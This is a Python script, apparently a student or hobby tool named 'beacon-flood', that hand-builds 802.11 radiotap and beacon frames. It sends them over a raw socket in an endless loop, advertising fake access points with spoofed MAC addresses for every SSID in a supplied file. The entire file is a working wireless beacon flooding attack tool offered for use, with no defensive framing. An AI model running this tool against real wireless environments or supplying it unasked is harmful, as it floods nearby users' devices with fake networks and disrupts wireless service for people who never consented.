import socket
import sys
import time
from struct import *

class RadiotapHeader :
    def __init__(self) :
        self.Header_revision = b'\x00'                                  # 1 byte
        self.Header_pad = b'\x00'                                       # 1 byte
        self.Header_length = pack('h', 24)                              # 2 byte
        self.Present_flags_word = b'\x2e\x40\x00\xa0\x20\x08\x00\x00'   # 8 byte
        self.Flags = b'\x00'                                            # 1 byte
        self.Data_rate = b'\x02'                                        # 1 byte
        self.Channel_frequency = pack('h', 2412)                        # 2 byte
        self.Channel_flags = b'\x00\xa0'                                # 2 byte
        self.Antenna_signal1 = pack('h', -57)                           # 2 byte
        self.RX_flags = b'\x00\x00'                                     # 2 byte
        self.Antenna_signal2 = self.Antenna_signal1                     # 2 byte

class BeaconFrameHeader :
    def __init__(self, num) :
        self.Frame_control = b'\x80\x00'                            # 2 byte, 08 = beacon frame
        self.Duration = b'\x00\x00'                                 # 2 byte
        self.Ds_address = b'\xff\xff\xff\xff\xff\xff'               # 6 byte, Broadcast
        self.Ts_address = b'\x88\x36\x6c\xf0\xcd' + pack('b', num)  # 6 byte, AP MAC Address
        self.BSS_id = self.Ts_address                               # 6 byte
        self.Sequence_number = pack('h', 1234)                      # 2 byte
    
class BeaconFixedParameter :
    def __init__(self) :
        self.Timestamp = b'\xee\x61\x67\x40\xca\x00\x00\x00'    # 8 byte
        self.Beacon_interval = b'\x64\x00'                      # 2 byte
        self.Capabilities_info = b'\x14\x11'                    # 2 byte

class BeaconTaggedParameter :
    def __init__(self, SSID) :
        self.SSID_Num = b'\x00'                                             # 1 byte
        self.SSID_Length = pack('b', len(SSID.encode('utf-8')))             # 1 byte
        self.SSID = SSID.encode('utf-8')                                    # SSID
        self.Supported_rate = b'\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c'   # 10 byte
        self.DS_Param_set = b'\x03'                                         # 1 byte
        self.DS_Length = b'\x01'                                            # 1 byte
        self.DS_Channel = b'\x0b'                                           # 1 byte


if len(sys.argv) !=  3:
    print("syntax : sudo python3 beacon-flood <interface> <ssid-list-file>")
    sys.exit()
interface_name = str(sys.argv[1])
file_name = str(sys.argv[2])
# 인터페이스 명 및 파일 명 지정

f = open(file_name, 'r')
SSID_list = []
lines = f.readlines()
for line in lines:
    SSID_list.append(line.strip())

while 1:
    for i, ssid in enumerate(SSID_list, start = 0):
        rh = RadiotapHeader()
        radiotap_header_packet = bytes()
        for value in rh.__dict__.values():
            radiotap_header_packet += value
        # Radiotap_Header

        bh = BeaconFrameHeader(i)
        beacon_header_packet = bytes()
        for value in bh.__dict__.values():
            beacon_header_packet += value
        # Beacon_Frame_Header

        bfp = BeaconFixedParameter()
        beacon_fixparam_packet = bytes()
        for value in bfp.__dict__.values():
            beacon_fixparam_packet += value
        # Beacon_Frame_Fixed_Parameter

        btp = BeaconTaggedParameter(ssid)
        beacon_tagparam_packet = bytes()
        for value in btp.__dict__.values():
            beacon_tagparam_packet += value
        # Beacon_Frame_Tagged_Parameter

        rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        rawSocket.bind((interface_name,0))
        rawSocket.send(radiotap_header_packet + beacon_header_packet + beacon_fixparam_packet + beacon_tagparam_packet)
        # 패킷 송신
    time.sleep(0.3)

